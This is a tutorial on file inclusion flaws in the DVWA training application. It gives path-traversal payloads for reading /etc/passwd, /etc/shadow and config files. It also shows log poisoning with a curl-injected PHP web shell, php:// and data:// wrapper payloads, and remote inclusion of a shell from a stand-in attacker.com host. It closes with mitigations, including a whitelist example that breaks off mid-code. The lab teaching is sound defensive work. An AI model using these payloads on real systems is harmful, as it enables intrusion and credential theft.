File Inclusion


🔍 What Is It?

File Inclusion vulnerabilities occur when a web application dynamically includes files based on user-supplied input without proper validation. There are two types:

LFI (Local File Inclusion) — includes files already on the server
RFI (Remote File Inclusion) — includes files from a remote URL
Both can lead to information disclosure, code execution, and full server compromise.


⚙️ How It Works in DVWA

DVWA's File Inclusion module uses a page parameter to load content:
php// Vulnerable code
include($_GET['page']);
The intended usage is ?page=file1.php, but an attacker can pass any path.


💥 Exploitation


Local File Inclusion (LFI)
Read sensitive system files:

?page=../../../../etc/passwd

?page=../../../../etc/shadow

?page=../../../../var/www/html/dvwa/config/config.inc.php

?page=../../../../windows/win.ini     (Windows)



Log Poisoning (LFI → RCE):


Inject PHP code into a log file via User-Agent:
bashcurl -A "<?php system($_GET['cmd']); ?>" http://dvwa/
Include the log file:

?page=../../../../var/log/apache2/access.log&cmd=whoami
PHP Wrappers (bypass restrictions):
?page=php://filter/convert.base64-encode/resource=config.inc.php
Decoding the output reveals the file contents.
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=id
(Executes <?php system($_GET['cmd']); ?> via data wrapper)
Remote File Inclusion (RFI)
Requires allow_url_include = On in php.ini:
?page=http://attacker.com/shell.txt
shell.txt on the attacker's server:
php<?php system($_GET['cmd']); ?>



🔐 Mitigation


MethodDescriptionWhitelistOnly allow specific known filenames to be includedDisable RFISet allow_url_include = Off in php.iniInput ValidationReject ../, http://, php:// in parametersChroot / Open BasedirRestrict PHP's file access to a specific directory
php// ✅ Safe - Whitelist approach
$allowed = ['file1.php', 'file2.php', 'file3.php'];
if (in_array($_GET['page'], $allowed)) {
    include($_GET['page']);
